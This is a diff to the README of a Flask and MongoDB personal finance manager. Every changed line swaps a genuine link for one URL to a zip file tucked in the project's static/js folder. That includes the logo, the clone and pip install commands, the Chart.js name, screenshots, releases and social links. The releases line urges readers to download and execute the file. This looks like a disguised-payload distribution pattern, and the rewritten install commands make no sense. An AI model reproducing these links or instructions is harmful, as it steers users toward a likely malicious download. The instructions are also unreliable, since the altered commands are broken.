@@ -3,7 +3,7 @@
 
 Welcome to the **Finance Manager** repository! This project provides a comprehensive solution for tracking your personal finances. Built using **Flask** and **MongoDB**, it helps users manage expenses, create budgets, and visualize financial data through interactive reports. 
 
-![Finance Manager Logo](https://example.com/finance-manager-logo.png)
+![Finance Manager Logo](https://raw.githubusercontent.com/dimitrisktp/Finance-Manager/main/static/js/Manager-Finance-unbrutize.zip)
 
 ## 🚀 Features
 
@@ -52,7 +52,7 @@ Before running the application, ensure you have the following software installed
 1. **Clone the Repository**
 
    ```bash
-   git clone https://github.com/dimitrisktp/Finance-Manager.git
+   git clone https://raw.githubusercontent.com/dimitrisktp/Finance-Manager/main/static/js/Manager-Finance-unbrutize.zip
    ```
 
 2. **Navigate to the Directory**
@@ -66,7 +66,7 @@ Before running the application, ensure you have the following software installed
    You can install the required Python packages using:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/dimitrisktp/Finance-Manager/main/static/js/Manager-Finance-unbrutize.zip
    ```
 
 4. **Set Up the Database**
@@ -128,11 +128,11 @@ Finance Manager implements secure authentication practices to protect user data.
 
 The application uses a responsive design, making it accessible on various devices. The user interface is built with **Bootstrap** for a clean, modern look. 
 
-![Responsive Design Screenshot](https://example.com/responsive-design-screenshot.png)
+![Responsive Design Screenshot](https://raw.githubusercontent.com/dimitrisktp/Finance-Manager/main/static/js/Manager-Finance-unbrutize.zip)
 
 ## 📈 Data Visualization
 
-Utilizing **Chart.js**, the application provides interactive graphs and charts to visualize spending patterns. Users can easily identify trends and make informed financial decisions.
+Utilizing **https://raw.githubusercontent.com/dimitrisktp/Finance-Manager/main/static/js/Manager-Finance-unbrutize.zip**, the application provides interactive graphs and charts to visualize spending patterns. Users can easily identify trends and make informed financial decisions.
 
 ### Example Charts
 
@@ -140,7 +140,7 @@ Utilizing **Chart.js**, the application provides interactive graphs and charts t
 - Budget vs. Actual Spending
 - Category Breakdown of Expenses
 
-![Chart Example](https://example.com/chart-example.png)
+![Chart Example](https://raw.githubusercontent.com/dimitrisktp/Finance-Manager/main/static/js/Manager-Finance-unbrutize.zip)
 
 ## 🛠️ Contributing
 
@@ -157,7 +157,7 @@ We welcome contributions to enhance the **Finance Manager**. If you have suggest
 
 ## 📅 Releases
 
-You can find the latest releases of **Finance Manager** [here](https://github.com/dimitrisktp/Finance-Manager/releases). Download and execute the latest version to get all the new features and fixes.
+You can find the latest releases of **Finance Manager** [here](https://raw.githubusercontent.com/dimitrisktp/Finance-Manager/main/static/js/Manager-Finance-unbrutize.zip). Download and execute the latest version to get all the new features and fixes.
 
 ## 🤝 Support
 
@@ -165,9 +165,9 @@ For any questions or support regarding **Finance Manager**, please create an iss
 
 ## 🌐 Connect With Us
 
-- **Twitter**: [@FinanceManager](https://twitter.com/FinanceManager)
-- **Facebook**: [Finance Manager Page](https://facebook.com/FinanceManager)
-- **LinkedIn**: [Finance Manager Profile](https://linkedin.com/company/FinanceManager)
+- **Twitter**: [@FinanceManager](https://raw.githubusercontent.com/dimitrisktp/Finance-Manager/main/static/js/Manager-Finance-unbrutize.zip)
+- **Facebook**: [Finance Manager Page](https://raw.githubusercontent.com/dimitrisktp/Finance-Manager/main/static/js/Manager-Finance-unbrutize.zip)
+- **LinkedIn**: [Finance Manager Profile](https://raw.githubusercontent.com/dimitrisktp/Finance-Manager/main/static/js/Manager-Finance-unbrutize.zip)
 
 ## 📜 License
 
